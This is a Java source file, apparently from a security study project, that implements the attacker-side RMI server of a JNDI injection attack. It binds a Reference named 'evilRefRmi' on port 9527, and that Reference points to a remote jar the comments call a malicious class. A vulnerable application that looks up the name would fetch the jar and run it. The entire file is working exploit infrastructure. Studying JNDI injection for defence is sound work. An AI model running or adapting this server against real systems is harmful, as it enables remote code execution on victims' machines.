package cc.saferoad.jndi;/*
@auther S0cke3t
@date 2021-11-18
*/

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMIReferenceServer {
    //定义RMI监听端口,主机,Name
    private static int RMI_PORT = 9527;
    private static String RMI_HOST = "127.0.0.1";
    public static String RMI_NAME = "rmi://" + RMI_HOST + ":" + RMI_PORT + "/evilRefRmi";
    public static void main(String[] args) {
        try{
             //定义远程恶意jar包路径，其中包含实现ObjectFactory接口的恶意类
             String evilJarUrl = "http://javasec.local.me/ReferenceObjectFactory.jar";
             //定义恶意jar包中恶意类的包名
            String evilClassName = "cc.saferoad.jndi.ReferenceObjectFactory";
            //创建RMI register
            LocateRegistry.createRegistry(RMI_PORT);
            //创建远程JNDI恶意类的引用对象
            Reference reference = new Reference(evilClassName,evilClassName,evilJarUrl);
            //转换为RMI引用对象
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            //绑定RMI对象
            Naming.bind(RMI_NAME,referenceWrapper);
            System.out.println("RMI服务启动成功,服务地址:" + RMI_NAME);
        }
        catch(Exception e){
            e.printStackTrace();
        }
    }
}
